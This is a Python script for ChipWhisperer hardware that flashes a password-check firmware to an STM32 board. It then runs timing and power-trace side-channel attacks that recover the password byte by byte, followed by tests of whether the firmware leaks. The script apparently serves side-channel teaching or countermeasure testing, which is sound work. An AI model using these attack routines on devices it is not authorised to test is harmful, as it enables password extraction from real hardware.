import sys
import string
import random
import chipwhisperer as cw
from PATools import *
from scipy.stats import pearsonr
def reset():
  # reset scope and target
  st.target_clock = 24000000
  st.scope.default_setup()
  st.scope.gain.gain = 30
  st.scope.adc.samples = 24000
  st.scope.adc.offset = 0
  st.scope.clock.adc_src = "clkgen_x4"
  st.set_clock()
  st.reset_target()
def getone(tx):
  # get one power trace with input tx
  st.scope.arm()
  st.target.simpleserial_write('p', tx)
  rx  = st.target.simpleserial_read('r', 5)
  ret = st.scope.capture()
  if ret:
    print('Timeout happened during acquisition')
  trc = st.scope.get_last_trace()
  return(trc[:st.scope.adc.trig_count],rx,bytes(tx))
def random_string(length=9):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length)).encode('utf-8')
def random_bytes(length=9):
    return bytearray(random.getrandbits(8) for _ in range(length))
def test():
  (_,rx1,_) = getone(random_bytes())
  (_,rx2,_) = getone(b"verysafe\x00")
  if rx1 != b"Fail\x00" or rx2 != b"Pass\x00":
    print("Failed at flash")
def flash(fw):
  st.scope.default_setup()
  prog = cw.programmers.STM32FProgrammer
  cw.program_target(st.scope, prog, fw)
  reset()
  test()
def corroff(trc,pat):
    # calculate offset of pattern in the trace where correlation is maximized
    # i.e. approximate position of pattern in trace
    i = 0
    c = 0
    for o in range(trc.size-pat.size):
        x, _ = pearsonr(pat,trc[o:o+pat.size])
        if x>c:
            i = o
            c = x
    return (i,c)
def attack_nopower():
  print("Running: attack_withpower\n")
  succ=b"Pass\x00"
  pref=b""
  suff=b"xxxxxxxx\x00"
  chrs=list(string.ascii_lowercase) # + string.ascii_uppercase + string.digits)
  (trc,_,_) = getone(suff)
  off = st.scope.adc.trig_count
  for i in trange(0,8):
    found = False
    for c in chrs:
      tx = pref + c.encode('utf-8') + suff[i+1:]
      (trc,rx,_) = getone(tx)
      soff = st.scope.adc.trig_count
      if rx==succ:
        print("Found pswd:",tx)
        return True
      elif soff < off:
        off  = soff
        pref = pref+c.encode('utf-8')
        print("Found byte:",pref)
        found = True
        break
    if not found:
      print("Could not find byte at offset:",i)
      return False
def attack_withpower():
  print("Running: attack_withpower\n")
  (trc,_,_) = getone(random_bytes())
  patt = trc[-100:]
  succ="Pass\x00".encode('utf-8')
  pref="".encode('utf-8')
  suff="xxxxxxxx\x00".encode('utf-8')
  chrs=list(string.ascii_lowercase) # + string.ascii_uppercase + string.digits)
  (trc,_,_) = getone(suff)
  off=corroff(trc,patt)[0]
  for i in trange(0,8):
    found = False
    for c in chrs:
      tx = pref + c.encode('utf-8') + suff[i+1:]
      (trc,rx,_) = getone(tx)
      soff = corroff(trc,patt)[0]
      if rx==succ:
        print("Found pswd:",tx)
        return True
      elif soff < off:
        off  = soff
        pref = pref+c.encode('utf-8')
        print("Found byte:",pref)
        found = True
        break
    if not found:
      print("Could not find byte at offset:",i)
      return False
def test_nopower(secr,pswd):
  (_,_,_) = getone(secr)
  off1 = st.scope.adc.trig_count
  (_,_,_) = getone(pswd)
  off2 = st.scope.adc.trig_count
  if off1==off2:
    print("test_nopower: Passed")
    return 0
  print("test_nopower: Failed ", off1, off2)
  return 1
def test_withpower(secr,pswd):
  (trc,_,_) = getone(pswd)
  patt = trc[-100:]
  (trc,_,_) = getone(secr)
  off1 = corroff(trc,patt)[0]
  (trc,_,_) = getone(pswd)
  off2 = corroff(trc,patt)[0]
  if off1==off2:
    print("test_withpower Passed")
    return 0
  print("test_withpower: Failed",off1,off2)
  return 1

st = ScopeTarget((), (cw.targets.SimpleSerial,))
flash('./simplepass-CW308_STM32F3.hex')

secr = b"verysafe\x00"
pswd = b"xxxxxxxx\x00"


print("\nRunning Attacks")
attack_withpower()
attack_nopower()

print("\nRunning Tests")
ret  = 0
ret += test_withpower(secr,pswd)
ret += test_nopower(secr,pswd)
sys.exit(ret)

